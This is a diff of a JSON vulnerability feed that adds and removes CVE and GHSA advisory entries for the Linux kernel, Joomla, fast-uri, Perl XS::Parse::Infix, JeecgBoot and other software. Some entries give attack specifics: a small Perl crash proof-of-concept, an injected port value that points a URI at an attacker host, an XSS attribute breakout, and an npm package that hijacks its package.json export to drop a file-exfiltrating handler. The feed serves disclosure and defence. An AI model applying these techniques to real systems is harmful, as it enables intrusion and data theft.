+        "https://git.kernel.org/stable/c/05ebe1e1d7d38c2612bacfefe043a33572ae34cb",
+        "https://git.kernel.org/stable/c/372f8534244d632ad5118e8a87a11291b01712d3",
+        "https://git.kernel.org/stable/c/7a49d19ff9baaf61217e5ec14199c18bc2d93ee4",
+        "https://git.kernel.org/stable/c/ddbe921ed16a0ad2d9e09574c3f3aabec7528325"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-89738",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nusb: gadget: at91_udc: drain polled-VBUS timer/work before udc is freed\n\nIn polled-VBUS mode (board.vbus_pin && board.vbus_polled), probe arms a\nself-restarting cycle: at91_vbus_timer() schedules vbus_timer_work, and\nat91_vbus_timer_work() calls at91_vbus_update() and re-arms the timer via\nmod_timer(). Both recover the same udc through container_of and dereference\nit on every iteration.\n\nNeither teardown path cancels this cycle. udc is devm-allocated, so it is\nfreed after at91udc_remove() returns, and is likewise freed when probe\nfails and devres runs. A timer callback or work item that is pending or\nrunning at either point dereferences the freed udc.\n\nAdd at91_udc_shutdown_vbus_timer() and call it from at91udc_remove() and\nfrom the usb_add_gadget_udc() failure path in probe; the remaining probe\nerror paths fail before the timer is armed. timer_shutdown_sync() waits\nfor a running callback and clears timer->function, which makes the work\nhandler's mod_timer() a permanent no-op; cancel_work_sync() then drains\nany pending or running work whose re-arm attempt now does nothing. The\ntimer must be shut down first, since cancelling the work alone would let\nthe timer re-queue it. The guard mirrors probe: in IRQ mode the timer and\nwork_struct are never initialized.\n\nThis does not require a fault; a normal driver unbind can interleave with\nan already queued work item.\n\nThis issue was found by an in-house static analysis tool.",
+      "cvssScore": 6.1,
+      "severity": "Medium",
+      "published": "2026-09-11",
+      "modified": "2026-09-13",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-89738",
+        "https://git.kernel.org/stable/c/51a311eb97e91ce1aed3005cb71ccb2e30f8cce8",
+        "https://git.kernel.org/stable/c/557ef547d49ff5e6026a4d39bdd3113bd81d7688",
+        "https://git.kernel.org/stable/c/a2a602cb1e28d76a5398cec3fa21b0110385f501",
+        "https://git.kernel.org/stable/c/c27d13ce4bab80fbdf6523928071b6c24b37606c"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-89729",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nHID: sensor-hub: Fix out-of-bounds write in sensor_hub_get_feature\n\nsensor_hub_get_feature() clamps its return value to the caller's buffer\nsize, but the copy loop still copies field->report_size / 8 bytes for\neach report value. A malicious HID descriptor can advertise a large\nfeature field size while an IIO caller supplies a small stack buffer,\nsuch as a single s32, causing an out-of-bounds write.\n\nHID core stores parsed report values in __s32 slots and clamps extracted\nvalues to 32 bits. Reject feature fields that require more than one slot\nper value, guard the total byte count calculation, and clamp each\nper-value copy to the remaining caller buffer.",
+      "cvssScore": 7.1,
+      "severity": "High",
+      "published": "2026-09-11",
+      "modified": "2026-09-13",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-89729",
+        "https://git.kernel.org/stable/c/9f43499ce6458a572b781f6bb46c464ab59fa825",
+        "https://git.kernel.org/stable/c/bc3d72c44bff17688dc5f3e5132a53b51dae0f04",
+        "https://git.kernel.org/stable/c/c92693f3ed099401d0383ef35ca1fe1e6ba033de",
+        "https://git.kernel.org/stable/c/fa95b14198b6c8ea721b4784f466d3c2c2bac83a"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-89702",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nnfsd: size fh_verify server sockaddr slot by xpt_locallen\n\nThe nfsd_fh_verify and nfsd_fh_verify_err tracepoints declare the\nserver sockaddr slot sized by xpt_remotelen but fill it from\nxpt_local using xpt_locallen:\n\n    TP_STRUCT__entry(\n            ...\n            __sockaddr(server, rqstp->rq_xprt->xpt_remotelen)\n            ...\n    )\n    TP_fast_assign(\n            ...\n            __assign_sockaddr(server, &rqstp->rq_xprt->xpt_local,\n                              rqstp->rq_xprt->xpt_locallen);\n            ...\n    )\n\nWhen xpt_locallen exceeds xpt_remotelen, __assign_sockaddr's memcpy\nwrites past the reserved ring-buffer slot. In the reverse direction\n(xpt_locallen < xpt_remotelen) the slot is oversized and the\nunwritten tail leaks prior ring-buffer contents to trace consumers.\n\nThe write-past-end case is reachable on NFS/UDP. svc_xprt_set_remote()\nis only called from svc_tcp_accept() (net/sunrpc/svcsock.c) and from\nthe RDMA connect path; svc_create_socket() for UDP calls only\nsvc_xprt_set_local(), so xpt_remotelen stays 0 for the xprt's\nlifetime. Every fh_verify trace for an NFSv2/v3-over-UDP request\nthen copies 16 or 28 bytes from xpt_local into a zero-byte slot.\n\nThe other NFSD tracepoints that record the server address\n(NFSD_TRACE_PROC_CALL_FIELDS, NFSD_TRACE_PROC_RES_FIELDS,\nSVC_RQST_ENDPOINT_FIELDS) already size the server slot by\nxpt_locallen; nfsd_fh_verify and nfsd_fh_verify_err were the only\nexceptions.\n\nFix by sizing the server slot with xpt_locallen so the declared slot\nmatches the copy length. The client slot and its assignment already\nagree on xpt_remotelen and are left untouched.",
+      "cvssScore": 8.1,
+      "severity": "High",
+      "published": "2026-09-11",
+      "modified": "2026-09-13",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-89702",
+        "https://git.kernel.org/stable/c/719a10e3f5f868c3c4ac3cf3648c5775d12034bd",
+        "https://git.kernel.org/stable/c/71d068490098b1d23c63b2345e40675d3a1ca763",
+        "https://git.kernel.org/stable/c/7ff8d6363cffff45654ea85e319f7c0c54226012",
+        "https://git.kernel.org/stable/c/95d064f9828a20ccca5ae90a17be3e2076f25272"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-89713",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nNFSD: check truncate permission under inode lock\n\nnfsd_setattr() checks whether a size update needs NFSD_MAY_TRUNC\nbefore it takes inode_lock(). The comparison uses the file size sampled\nby that unlocked read, but the actual ATTR_SIZE update is applied later\nunder inode_lock() by notify_change().\n\nThis leaves a TOCTOU window for append-only files. If a client sends a\nSETATTR that does not shrink the file at the time of the unlocked\nsample, a concurrent append can extend the file before nfsd_setattr()\ntakes inode_lock(). notify_change() then applies a real truncation\nwithout the NFSD_MAY_TRUNC check that rejects IS_APPEND(inode). The VFS\ntruncate syscall paths perform their own append-only checks before\ncalling notify_change(), so NFSD must make this decision against the\nlocked size it is about to change.\n\nSplit the write-count acquisition from the truncation permission check.\nKeep get_write_access() before the locked setattr work, then recheck\nwhether the requested size is below i_size_read(inode) after inode_lock()\nhas been acquired and before notify_change(ATTR_SIZE). This also avoids\nthe plain unlocked inode->i_size load.",
+      "cvssScore": 8.1,
+      "severity": "High",
+      "published": "2026-09-11",
+      "modified": "2026-09-13",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-89713",
+        "https://git.kernel.org/stable/c/3afa17d93ba8c925f49370c816c6dae5112d8c24",
+        "https://git.kernel.org/stable/c/44086254479035de42ca3d286ecf25521d4e6325",
+        "https://git.kernel.org/stable/c/b778e0e0a16759f22a70579c3cf8d254a40d4a7f",
+        "https://git.kernel.org/stable/c/d8352da196349182e1afd5a93308256cddc0a97d"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2026-89707",
+      "summary": "In the Linux kernel, the following vulnerability has been resolved:\n\nnfsd: release path refs on follow_down() error\n\nnfsd_cross_mnt() initializes a local struct path with mntget() and\ndget() before calling follow_down(). On a negative return the error\narm jumps to out without releasing those references:\n\n    err = follow_down(&path, follow_flags);\n    if (err < 0)\n            goto out;\n\nfollow_down() never drops the caller's entry-time refs on any error\nsub-case; for example a pre-cross d_manage() failure leaves path\nuntouched, so the mntget()/dget() taken on entry survive the call.\n\nEvery other early-exit arm in nfsd_cross_mnt() (other-namespace\nreturn, IS_ERR(exp2), and the success tail after the swap) already\ncalls path_put(&path); the err < 0 arm is the lone omission. The\nleak inflates mnt_count and d_count on each failed cross-mount,\nblocking umount and pinning dentries against the shrinker, and is\nreachable by any authenticated NFS client through nfsd_lookup_dentry\nor the NFSv4 READDIR encode path.\n\nFix by calling path_put(&path) before the goto out in the err < 0\narm so the entry-time refs are released on all follow_down() error\nreturns.",
+      "cvssScore": 8.1,
+      "severity": "High",
+      "published": "2026-09-11",
+      "modified": "2026-09-13",
+      "cwe": null,
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-89707",
+        "https://git.kernel.org/stable/c/194316df81263519156ebe714c4a286bee00e5be",
+        "https://git.kernel.org/stable/c/2bc4343308d85ee4e0dd3877b384306c96f114c2",
+        "https://git.kernel.org/stable/c/467d56fd3ff57447a790c6dc3ede2d02a947d224",
+        "https://git.kernel.org/stable/c/6cba08dc1922140d260cfeb30bbda4ee1bf869d8"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2000-0708",
+      "summary": "Buffer overflow in Pragma Systems TelnetServer 2000 version 4.0 allows remote attackers to cause a denial of service via a long series of null characters to the rexec port.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "2000-10-20",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind0008&L=NTBUGTRAQ&P=R4247",
+        "http://www.pragmasys.com/TelnetServer/",
+        "http://www.securityfocus.com/bid/1605",
+        "http://www.ntbugtraq.com/default.asp?pid=36&sid=1&A2=ind0008&L=NTBUGTRAQ&P=R4247",
+        "http://www.pragmasys.com/TelnetServer/"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2003-1368",
+      "summary": "Buffer overflow in the 32bit FTP client 9.49.1 allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via a long FTP server banner.",
+      "cvssScore": 6.4,
+      "severity": "Medium",
+      "published": "2003-12-31",
+      "modified": null,
+      "cwe": "CWE-119",
+      "references": [
+        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0054.html",
+        "http://www.securityfocus.com/bid/6764",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/11234",
+        "http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0054.html",
+        "http://www.securityfocus.com/bid/6764"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2004-1922",
+      "summary": "Microsoft Internet Explorer 5.5 and 6.0 allocates memory based on the memory size written in the BMP file instead of the actual BMP file size, which allows remote attackers to cause a denial of service (memory consumption) via a small BMP file with has a large memory size.",
+      "cvssScore": 2.6,
+      "severity": "Low",
+      "published": "2004-04-11",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://marc.info/?l=bugtraq&m=108183130827872&w=2",
+        "http://marc.info/?l=bugtraq&m=108183130827872&w=2"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-2002-2349",
+      "summary": "phpinfo.php in phpBBmod 1.3.3 executes the phpinfo function, which allows remote attackers to obtain sensitive environment information.",
       "cvssScore": 5,
       "severity": "Medium",
       "published": "2002-12-31",
       "modified": null,
-      "cwe": "CWE-119",
+      "cwe": "CWE-200",
       "references": [
-        "http://www.securityfocus.com/bid/6389",
-        "http://www.symantec.com/avcenter/security/Content/2002.12.12.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/10862",
-        "http://www.securityfocus.com/bid/6389",
-        "http://www.symantec.com/avcenter/security/Content/2002.12.12.html"
+        "http://www.iss.net/security_center/static/10335.php",
+        "http://www.securityfocus.com/archive/1/294701",
+        "http://www.securityfocus.com/bid/5942",
+        "http://www.iss.net/security_center/static/10335.php",
+        "http://www.securityfocus.com/archive/1/294701"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-100753",
-      "summary": "Joomla Extension - ordasoft.com - Reflected Cross-Site Scripting in Real Estate Manager (Free) < 6.7.9 -  The public property-detail page’s “leave a review” form repopulates its title field directly from the request with no escaping and no filtering function of any kind, unlike the adjacent comment field on the same form, which at least receives partial tag-stripping. A \" character in the title query parameter breaks out of the HTML attribute the value is placed in, allowing a following <script> element to execute in the browser of anyone who loads the crafted link.",
-      "cvssScore": null,
+      "id": "CVE-2002-2350",
+      "summary": "Cross-site scripting (XSS) vulnerability in z_user_show.php in dbtreelistproperty_method.php in Zorum 2.4 allows remote attackers to inject arbitrary web script or HTML via the class parameter.",
+      "cvssScore": 4.3,
       "severity": "Medium",
-      "published": "2026-09-28",
-      "modified": "2026-09-28",
-      "cwe": null,
+      "published": "2002-12-31",
+      "modified": null,
+      "cwe": "CWE-79",
       "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-100753",
-        "https://www.ordasoft.com"
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0152.html",
+        "http://www.iss.net/security_center/static/10337.php",
+        "http://archives.neohapsis.com/archives/bugtraq/2002-10/0152.html",
+        "http://www.iss.net/security_center/static/10337.php"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2026-100752",
-      "summary": "Joomla Extension - ordasoft.com - Unauthenticated SQL Injection in Real Estate Manager (Free) < 6.7.9 - site/realestatemanager.php builds the ORDER BY clause of three separate frontend property-listing queries (category browsing, search results, and the full property listing) from a request-controlled order_field parameter, concatenated directly into an unquoted SQL clause with no allow-list of real column names and no cast.",
-      "cvssScore": null,
-      "severity": "Critical",
-      "published": "2026-09-28",
-      "modified": "2026-09-28",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-100752",
-        "https://www.ordasoft.com"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-85644",
-      "summary": "XS::Parse::Infix versions from 0.40 through 0.49 for Perl treat a number as an array reference.\n\nThe wrapper function XS::Parse::Infix generates for a list-associative infix operator checks whether arguments are array references, but it tests using SvRV() rather than SvROK(). SvRV() reads a union slot that only holds a referent once SvROK(sv) is true, so the guard never validates that it is a reference. For an IV or NV that slot holds the number itself, SvRV() returns the caller's value and SvTYPE() dereferences it at offset 12. This will generally result in a segmentation fault.\n\nAn application that hands the wrapper a list built from decoded input (for example, from JSON) lets whoever supplies a number in that list choose the address that the interpreter dereferences.\n\nAn ordinary string's byte 12 is rarely SVt_PVAV so the guard croaks by luck, but an attacker-crafted string carrying 0x0b there passes, and the buffer is then used as an AV head, with AvARRAY taken from bytes 16-23 and its entries pushed onto the Perl stack as live SVs.\n\nA simple proof-of-concept uses the zip operator:\n\n    use Syntax::Operator::Zip 'zip';\n\n    my @args = ([1], 2);\n    zip(@args);",
+      "id": "CVE-2026-92139",
+      "summary": "Jenkins Bitbucket Push and Pull Request Plugin 4.0.1 and earlier trusts values provided in the webhook payload, including certain URLs, and uses configured Bitbucket credentials to connect to those URLs, allowing attackers to capture Bitbucket credentials stored in Jenkins by sending a crafted webhook payload.",
       "cvssScore": null,
       "severity": "Unknown",
-      "published": "2026-09-28",
-      "modified": "2026-09-28",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-85644",
-        "https://metacpan.org/release/PEVANS/XS-Parse-Keyword-0.50/changes",
-        "https://metacpan.org/release/PEVANS/XS-Parse-Keyword-0.50/diff/PEVANS/XS-Parse-Keyword-0.49#src/infix.c",
-        "http://www.openwall.com/lists/oss-security/2026/09/28/14"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2024-58304",
-      "summary": "SPA-CART CMS 1.9.0.3 contains a stored cross-site scripting vulnerability in the product description parameter that allows authenticated administrators to inject malicious scripts. Attackers can submit JavaScript payloads through the 'descr' parameter in the product edit form to execute arbitrary code in administrative users' browsers.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2025-12-12",
-      "modified": "2026-09-28",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2024-58304",
-        "https://github.com/olegkhorev/php-spa-cart/releases/tag/v2.0.0",
-        "https://spa-cart.com",
-        "https://www.exploit-db.com/exploits/51919",
-        "https://www.vulncheck.com/advisories/spa-cart-cms-stored-cross-site-scripting-via-product-description"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-84292",
-      "summary": "### Impact\n\n`fast-uri` serializes the `port` component of a URI without validating it. When recomposing the authority, `fast-uri` escapes the userinfo and host components but concatenates the port verbatim, so a `port` value that is not a sequence of digits can inject authority delimiters. For example, serializing a component whose `port` is `@127.0.0.1:8124` produces `http://trusted.example:@127.0.0.1:8124/app`, demoting the intended host to userinfo and pointing the authority at an attacker-controlled host. Both `fast-uri` and Node's `URL` read the result back as the attacker's host with no error, so re-validating the built URI does not catch it.\n\nThis affects applications that build URIs from parts and assign untrusted data to the `port` component (for example a fixed host from configuration and a port taken from user input or a service record). The same path is reachable through `serialize()`, `normalize()`, and `equal()` in their object forms. A `port` obtained from `parse()` is always digits and is not affected.\n\n### Patches\n\nThis vulnerability has been patched in fast-uri `4.1.4`, `3.1.7`, and `2.4.6`. `recomposeAuthority` now rejects any port that is not `*DIGIT` per RFC 3986. All users should upgrade.\n\n### Workarounds\n\nIf upgrading is not immediately possible, validate the `port` value against the RFC 3986 grammar (digits only) before passing a component to `serialize()`, `normalize()`, or `equal()`, and reject anything else, for example `if (!/^\\d*$/.test(String(port))) throw new Error('invalid port')`.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-09-28",
-      "modified": "2026-09-28",
-      "cwe": {
-        "cwe_id": "CWE-116",
-        "name": "Improper Encoding or Escaping of Output"
-      },
-      "references": [
-        "https://github.com/fastify/fast-uri/security/advisories/GHSA-qw65-cvwx-89v3",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-84292",
-        "https://github.com/fastify/fast-uri/commit/820e8478dd7da3d09f187bfaf35d50b71f67b8b4",
-        "https://cna.openjsf.org/security-advisories.html",
-        "https://github.com/fastify/fast-uri/releases/tag/v2.4.6"
-      ],
-      "vulnerableProducts": [
-        "fast-uri npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0038",
-      "summary": "glFtpD includes a default glftpd user account with a default password and a UID of 0.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "1999-12-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0038",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0038"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-0040",
-      "summary": "glFtpD allows local users to gain privileges via metacharacters in the SITE ZIPCHK command.",
-      "cvssScore": 10,
-      "severity": "Critical",
-      "published": "1999-12-23",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0040",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-2000-0040"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-1999-0892",
-      "summary": "Buffer overflow in Netscape Communicator before 4.7 via a dynamic font whose length field is less than the size of the font.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "1999-12-24",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0892",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0892"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "GHSA-F8XR-GJFQ-XFCP",
-      "summary": "_-= Per source details. Do not edit below this line.=-_\n\nThe package's `exports` field maps the `./package.json` subpath to `setup.js`, so any consumer resolving `require('z-deno-truth-bwhlsz/package.json')` executes JavaScript instead of reading the manifest. `setup.js` writes a Deno/Hono handler to `/tmp/h.tsx` that reads `/readflag`, `/flagserver`, `/app/backdoor.tsx`, and `/entrypoint.sh` from the host filesystem and returns their contents in the HTTP response, matching on a `hitcon{...}` pattern. The exports subpath hijack turns routine package-metadata resolution into arbitrary code execution on the installer, and the dropped file is a shipped exfiltration handler intended to be picked up by a Deno server on the host. While the file-read targets are specific to a CTF environment, the delivery mechanism (subpath hijack + filesystem drop) executes on any host that resolves the package's `./package.json` subpath.\n\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "cvssScore": null,
-      "severity": "Unknown",
-      "published": "2026-09-23",
-      "modified": "2026-09-23",
-      "cwe": null,
-      "references": [
-        "https://github.com/advisories/GHSA-f8xr-gjfq-xfcp",
-        "https://www.npmjs.com/package/z-deno-truth-bwhlsz/v/2.0.0",
-        "https://www.npmjs.com/package/z-deno-truth-bwhlsz/v/1.0.0"
-      ],
-      "vulnerableProducts": [
-        "z-deno-truth-bwhlsz npm"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108644",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the SysCategoryController delete handler that allows any authenticated user to delete category dictionary nodes. Low-privileged attackers can obtain node ids from the unguarded rootList and childList endpoints and delete entire sys_category subtrees, breaking dependent forms and dictionary fields.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108644",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_console_delete_routes.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysCategoryController.java#L165-L177",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-sys-category-delete"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108639",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability that allows any authenticated user to permanently delete data dictionaries via the deletePhysic handler of SysDictController. Low-privileged attackers can send DELETE requests to /sys/dict/deletePhysic/{id} to irreversibly remove active dictionaries and all their items, bypassing the recycle bin.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108639",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_dict_physic_delete.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysDictController.java#L742-L751",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-sys-dict-deletephysic-id"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108638",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability that allows low-privileged authenticated users to remove group memberships via the deleteGroupUser handler in SysUserController. Attackers can send DELETE requests with arbitrary groupId and userId values to remove any user from any administrator-maintained user group without ownership or tenant checks.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108638",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_user_group_member_removal.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysUserController.java#L829-L844",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-sys-user-deletegroupuser"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108642",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability in SysAnnouncementSendController that allows authenticated users to modify other users' message delivery records. Attackers can obtain delivery ids from GET /sys/sysAnnouncementSend/list and submit edit requests that overwrite read flags, recipient ids, or linked announcements to hide messages from recipients.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108642",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_c094_announcementsend_edit.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysAnnouncementSendController.java#L116-L131",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-idor-via-put-sys-sysannouncementsend-edit"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108640",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability in the SysDepartRoleController queryById handler that lacks Shiro permission annotations. Low-privileged authenticated attackers can request GET /sys/sysDepartRole/queryById with any id to read department role names, codes, descriptions and audit fields.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108640",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_org_scope_reads.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysDepartRoleController.java#L170-L175",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-sys-sysdepartrole-querybyid"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108641",
-      "summary": "JeecgBoot through 3.9.5 contains an insecure direct object reference vulnerability that allows authenticated users to read other users' in-application messages via the getOne handler of SysAnnouncementSendController. Attackers can obtain delivery record ids from the unguarded /sys/sysAnnouncementSend/list endpoint and supply them as the sendId parameter to retrieve message titles, bodies, senders and recipients.",
-      "cvssScore": 4.2,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108641",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_announcement_send_get_one.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysAnnouncementSendController.java#L272-L276",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-idor-via-sys-sysannouncementsend-getone"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-108643",
-      "summary": "JeecgBoot through 3.9.5 contains a missing authorization vulnerability that allows low-privileged authenticated users to delete category dictionary entries via DELETE /sys/category/deleteBatch. Attackers can obtain node ids from the unguarded rootList and childList endpoints and submit them to recursively delete entire sys_category subtrees, breaking dependent forms and dictionary fields.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-11",
-      "modified": "2026-10-11",
-      "cwe": null,
-      "references": [
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-108643",
-        "https://github.com/AnkesKasty/cve-request-poc/blob/a7b6d1423555812d8efa26c91c5d0683164b31e5/JeecgBoot/poc_console_delete_routes.py",
-        "https://github.com/jeecgboot/JeecgBoot/blob/e3b9dc0aefe1943d9772b026f64ed671a7c82802/jeecg-boot/jeecg-module-system/jeecg-system-biz/src/main/java/org/jeecg/modules/system/controller/SysCategoryController.java#L184-L194",
-        "https://www.vulncheck.com/advisories/jeecgboot-through-3.9.5-missing-authorization-via-sys-category-deletebatch"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-110816",
